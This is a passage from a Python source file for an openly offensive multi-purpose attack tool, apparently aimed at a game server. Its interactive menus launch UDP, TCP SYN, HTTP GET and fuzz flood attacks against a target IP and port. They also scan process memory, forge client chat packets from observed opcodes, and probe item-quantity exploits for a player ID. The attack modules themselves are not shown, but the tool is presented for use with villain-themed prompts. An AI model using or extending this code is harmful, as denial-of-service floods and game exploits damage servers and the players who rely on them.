                    patt,mask = input("AOB pattern (hex): "), input("Mask (x?): ")
                    s_addr, e_addr = int(input("Start (hex, def 0x400000):") or "0x400000",16), int(input("End (hex, def 0x7FFFFFFF0000):") or "0x7FFFFFFF0000",16)
                    self.memory_module.find_aob(patt,mask,s_addr,e_addr)
                elif choice == '4': break
                else: print("Invalid.")
            except ValueError: logging.warning("Invalid numeric input.")
            except Exception as e: logging.error(f"Memory menu error: {e}")

    def ddos_menu(self):
        while True:
            print("\n--- DDoS Operations ---")
            print("1. UDP Flood | 2. TCP SYN Flood | 3. HTTP GET Flood | 4. Protocol Fuzz Flood")
            print("5. Stop Specific Attack | 6. Stop ALL Attacks | 7. Back")
            choice = input("Unleash the flood?: ")
            tip, tport = CONFIG.get('target_ip'), CONFIG.get('target_port')
            if choice in ['1','2','3','4','5']:
                tip_in = input(f"Target IP (def {tip}):") or tip
                tport_str_in = input(f"Target Port (def {tport}):") or str(tport or '')
                if not tip_in or not tport_str_in or not tport_str_in.isdigit(): logging.warning("Valid Target IP/Port needed."); continue
                tip, tport = tip_in, int(tport_str_in)
            payload_type = None
            try:
                if choice == '1': payload_type = "UDP_FLOOD"
                elif choice == '2': payload_type = "TCP_SYN_FLOOD"
                elif choice == '3': payload_type = "HTTP_GET_FLOOD"
                elif choice == '4': payload_type = "PROTOCOL_FUZZ_FLOOD"
                if payload_type: self.ddos_module.start_ddos(tip, tport, payload_type)
                elif choice == '5': self.ddos_module.stop_ddos(tip, tport, input("Payload type to stop: "))
                elif choice == '6': self.ddos_module.stop_all_ddos()
                elif choice == '7': break
                else: print("Invalid.")
            except Exception as e: logging.error(f"DDoS menu error: {e}")

    def advanced_packet_menu(self):
        while True:
            print("\n--- Advanced Packet Crafting ---")
            active_custom_layer_name = self.network_module.ClientSayPacket.name 
            print(f"1. Craft & Send '{active_custom_layer_name}' (Client-to-Server Chat Example)")
            print("2. Back to Main Menu")
            choice = input("Custom torment delivery?: ")
            try:
                if choice == '1':
                    if not CONFIG.get("target_ip") or not CONFIG.get("target_port"): logging.warning("Target IP/Port needed!"); continue
                    
                    # Defaults from the "attemptnumber3" or "newwwwwwchat" packet
                    default_opcode = 0x76cc88f1  
                    default_field_a = 0x6b060100 
                    default_field_b = 0x00000100 
                    default_field_c = 0x0000     
                    
                    print(f"\nCrafting '{active_custom_layer_name}': (Default fields from observed client chat)")
                    opcode_str = input(f"Opcode (hex, def 0x{default_opcode:X}): ") or f"0x{default_opcode:X}"
                    field_a_str = input(f"Field A (hex, def 0x{default_field_a:X}): ") or f"0x{default_field_a:X}"
                    field_b_str = input(f"Field B (hex, def 0x{default_field_b:X}): ") or f"0x{default_field_b:X}"
                    field_c_str = input(f"Field C (hex, short, def 0x{default_field_c:X}): ") or f"0x{default_field_c:X}"
                    message_str = input("Message string (e.g., attemptnumber3): ") or "test message"

                    try:
                        opcode = int(opcode_str, 0); field_a = int(field_a_str, 0)
                        field_b = int(field_b_str, 0); field_c = int(field_c_str, 0)
                    except ValueError: logging.error("Invalid hex/decimal input for numeric fields."); continue
                    
                    pkt = self.network_module.craft_specific_client_say_packet(
                        message_string=message_str, opcode=opcode,
                        field_a=field_a, field_b=field_b, field_c=field_c
                    )
                    if pkt: 
                        if input("Send this crafted ClientSayPacket? (y/n):").lower()=='y': 
                            self.network_module.send_packet(pkt)
                elif choice == '2': break
                else: print("Invalid.")
            except ValueError: logging.warning("Invalid numeric input.")
            except Exception as e: logging.error(f"Adv Packet menu error: {e}")

    def exploit_discovery_menu(self):
        while True:
            print("\n--- Exploit Discovery & Automation ---")
            print("1. Scan Common Vulns (Conceptual) | 2. Auto Fuzz (Conceptual)")
            print("3. Gen PoC (Conceptual) | 4. Probe Item Quantity Exploits | 5. Back")
            choice = input("Seek forbidden knowledge?: ")
            try:
                if choice == '1':
                    if not CONFIG.get("target_ip") or not CONFIG.get("target_port"): logging.warning("Target needed!"); continue
                    vulns = self.exploit_discovery_module.scan_for_common_vulnerabilities(CONFIG["target_ip"], CONFIG["target_port"])
                    if vulns: logging.info(f"Found conceptual vulns: {vulns}")
                elif choice == '2':
                    if not CONFIG.get("target_ip") or not CONFIG.get("target_port"): logging.warning("Target needed!"); continue
                    crashes = self.exploit_discovery_module.automated_fuzzing()
                    if crashes: logging.info(f"Simulated crashes: {crashes}")
                elif choice == '3': print(self.exploit_discovery_module.generate_poc(input("Vuln desc: ")))
                elif choice == '4':
                    if not CONFIG.get("target_ip") or not CONFIG.get("target_port"): logging.warning("Target needed!"); continue
                    item_id = int(input("Item ID: "))
                    action = input("Action (trade_add_item, drop_item, etc.): ") or "trade_add_item"
                    p_id = int(input(f"Source Player ID (def 12345): ") or 12345)
                    self.exploit_discovery_module.probe_item_quantity_exploit(item_id, action, p_id)
                elif choice == '5': break
                else: print("Invalid.")
            except ValueError: logging.warning("Invalid input.")
            except Exception as e: logging.error(f"Exploit menu error: {e}")
    
    def shutdown(self):
        logging.info("Shego's Tool Shutting Down..."); 
        if hasattr(self, 'network_module') and self.network_module: self.network_module.stop_sniffing()
        if hasattr(self, 'memory_module') and self.memory_module: self.memory_module.close()
        if hasattr(self, 'ddos_module') and self.ddos_module:
            self.ddos_module.stop_all_ddos()
            if self.ddos_module.executor: self.ddos_module.executor.shutdown(wait=True, cancel_futures=True)
        if hasattr(self, 'code_indexer') and self.code_indexer: self.code_indexer._save_index_to_disk()
        if self.gui_root and self.gui_root.winfo_exists(): self.gui_root.destroy()
        logging.info("Shutdown complete. My genius rests... for now."); sys.exit(0)

if __name__ == "__main__":
    tool = ShegosMasterTool()
    try: tool.menu()
    except KeyboardInterrupt: print("\nShego's annoyance: Cowardly exit."); tool.shutdown()
    except Exception as main_err: 
        logging.critical(f"SHEGO'S RAGE: MAIN CRASH: {main_err}"); 
        if 'pytest' not in sys.modules: traceback.print_exc()
        tool.shutdown()
